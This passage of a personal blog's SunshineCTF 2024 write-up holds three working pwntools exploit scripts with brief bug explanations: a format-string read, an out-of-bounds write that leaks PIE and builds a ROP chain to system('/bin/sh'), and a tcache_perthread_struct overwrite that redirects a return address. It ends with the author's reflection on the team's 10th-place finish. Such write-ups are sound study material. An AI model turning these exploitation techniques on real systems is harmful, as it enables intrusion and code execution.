<h3 id="script-4"><a href="#script-4" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./workshop&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24001&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0xffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa</span>+<span class="string">b&#x27;%9$s&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>

<h2 id="Adventure-On-the-High-C"><a href="#Adventure-On-the-High-C" class="headerlink" title="Adventure! On the High C!"></a>Adventure! On the High C!</h2><p>glibc 2.39</p>
<p>We can look this, we can input row and column and then enter this place.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;&lt;&lt;&lt; Fired outside board, corrupting %p from %02x to %02x!&quot;</span>,</span><br><span class="line">  &amp;enemy_board[<span class="number">16</span> * row_input + column_input],</span><br><span class="line">  *(&amp;savedregs + <span class="number">16</span> * row_input + column_input - <span class="number">528</span>),</span><br><span class="line">  choice);</span><br><span class="line">*(&amp;savedregs + <span class="number">16</span> * row_input + column_input - <span class="number">528</span>) = choice;</span><br></pre></td></tr></table></figure>

<p>It have filter your input, but still print and write wrong index. It is oob read and oob write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">filter_row_column</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &lt;= <span class="number">0xF</span> &amp;&amp; a2 &lt;= <span class="number">0xF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>oob read and oob write can leak PIE, write <code>/bin/sh\x00</code>, and write ROP to ret address<br>pop rdi + &#x2F;bin&#x2F;sh address + ret + system plt (offset you can use 16 * row + column to caculate)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 savedregs; <span class="comment">// [rsp+220h] [rbp+0h] BYREF</span></span><br></pre></td></tr></table></figure>

<h3 id="script-5"><a href="#script-5" class="headerlink" title="script"></a>script</h3><p>remote can work, but local don’t work. so strange</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./ship&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24003&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">row, column,<span class="built_in">ascii</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the row (0-9, a-f) &gt;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(row).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the column (0-9, a-f) &gt;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(column).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Choose missile type - Tomahawk (T), Hellfire (H), SideWinder (S), Custom (C) &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a custom missile as a single ASCII character &gt;&gt;&gt; &#x27;</span>,<span class="built_in">ascii</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">leakPIE = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> REMOTE_LOCAL == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        attack(<span class="number">37</span>,<span class="number">8</span>+i,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        attack(<span class="number">35</span>,<span class="number">8</span>+i,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    rcu(<span class="string">b&#x27;from &#x27;</span>)</span><br><span class="line">    leakPIE += <span class="built_in">int</span>(rcl()[:<span class="number">2</span>],<span class="number">16</span>) &lt;&lt; i*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">PIEbase = leakPIE - <span class="number">0x1437</span></span><br><span class="line"></span><br><span class="line">pop_rdi = PIEbase + <span class="number">0x1754</span></span><br><span class="line">system_plt = PIEbase + <span class="number">0x1060</span></span><br><span class="line">ret = pop_rdi + <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">attack(<span class="number">0</span>,<span class="number">20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;&lt;&lt;&lt; Fired outside board, corrupting &#x27;</span>)</span><br><span class="line">leakstack = <span class="built_in">int</span>(rcl()[:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.system(&#x27;echo &#x27;+hex(leakstack)+&#x27;&gt; a.txt&#x27;) # use debug</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binsh)):</span><br><span class="line">    attack(<span class="number">0</span>, <span class="number">1</span>+i, binsh[i])</span><br><span class="line"></span><br><span class="line">binsh_addr = leakstack - <span class="number">19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n * row + column</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">33</span>,<span class="number">8</span>+i,(pop_rdi &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">attack(<span class="number">33</span>,<span class="number">14</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">33</span>,<span class="number">15</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write pop rdi**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">34</span>,i,(binsh_addr &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">34</span>,<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">34</span>,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write /bin/sh**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">34</span>, i+<span class="number">8</span> , (ret &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">34</span>,<span class="number">14</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">34</span>,<span class="number">15</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write ret**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">35</span>,i,(system_plt &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">35</span>,<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">35</span>,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write system**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger ret address</span></span><br><span class="line">attack(<span class="number">32</span>,<span class="number">12</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKPIE&#x27;</span>,<span class="built_in">hex</span>(leakPIE))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;PIE BASE&#x27;</span>,<span class="built_in">hex</span>(PIEbase))</span><br><span class="line"><span class="built_in">print</span>(leakstack)</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>

<h2 id="heap01"><a href="#heap01" class="headerlink" title="heap01"></a>heap01</h2><p>glibc 2.35<br>It has oob on heap(two times).</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">inp = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">v2[inp] = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The chunk is still hungry... let&#x27;s fill it up some more!\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">v4 = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">v2[v4] = get_inp();</span><br></pre></td></tr></table></figure>
<p>We can write tcache_pthread_struct.<br>write tcache entry to stack(the binary give me stack) and tcache count(Must same as tcache entry size).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache entry[1] -&gt; stack address on ret address</span><br></pre></td></tr></table></figure>

<p>when malloc chunk, we will get fake chunk on stack.<br>write ret address to win function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="built_in">malloc</span>(size); <span class="comment">// malloc stack</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 1: &quot;</span>); <span class="comment">// write old rbp</span></span><br><span class="line">*v5 = get_inp(); </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 2 - &quot;</span>); <span class="comment">// write ret address to win </span></span><br><span class="line">v5[<span class="number">1</span>] = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 3 -&gt; &quot;</span>);</span><br><span class="line">v5[<span class="number">2</span>] = get_inp();</span><br></pre></td></tr></table></figure>

<h3 id="script-6"><a href="#script-6" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./heap01&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24006&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">win_address = <span class="number">0x40126b</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Do you want a leak? &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(rcls(<span class="number">2</span>)[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter chunk size: &#x27;</span>,<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;-578&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(leak_stack))</span><br><span class="line">sla(<span class="string">b&#x27;Value: &#x27;</span>,<span class="built_in">str</span>(leak_stack+<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;-596&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Value: &#x27;</span>,<span class="string">b&#x27;281479271743489&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Value 1: &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Value 2 - &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Value 3 -&gt; &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAK STACK&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>


<h2 id="after"><a href="#after" class="headerlink" title="after"></a>after</h2><p>Last year, Aukro, WH, and I played our first CTF together, starting with SunshineCTF 2023. We stayed up late solving challenges, and the most memorable one was extracting a git bundle, which we worked on until the middle of the night. After all the discussions, we finally finished in 76th place.</p>
<p>A year later, we came back to SunshineCTF. After clearing the scripting challenges, I play with Aukro on pwn (as a weber, I spent the whole time watching pwn, haha). We managed to solve 3 out of 6 pwn challenges and finished all pwn challenge with Aukro.</p>
<p>WAN ended up taking 10th place, marking my first top 10 finish on CTFtime. This also brought back the pure joy I once felt playing CTFs.</p>
<p>I really love that feeling in CTFs where everyone works together, stays up late solving challenges, and cheers when we finally solve them. It feels like staying up late playing video games, lol.</p>
<p>In the future, I’ll keep walking down the path of cybersecurity and CTFs. Thanks to WAN, CakeisTheFake, and all the partners I’ve studied cybersecurity with, as well as the seniors who taught me so much.</p>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="/images/banner.webp" data-sizes="auto" alt="Pwnable.tw-unexploitable" class="lazyload">
          
        
        <a href="/2024/10/24/Pwnable-unexploitable/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            Pwnable.tw-unexploitable
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="/images/banner.webp" data-sizes="auto" alt="Pwnable.tw-BookWriter" class="lazyload">
        
      
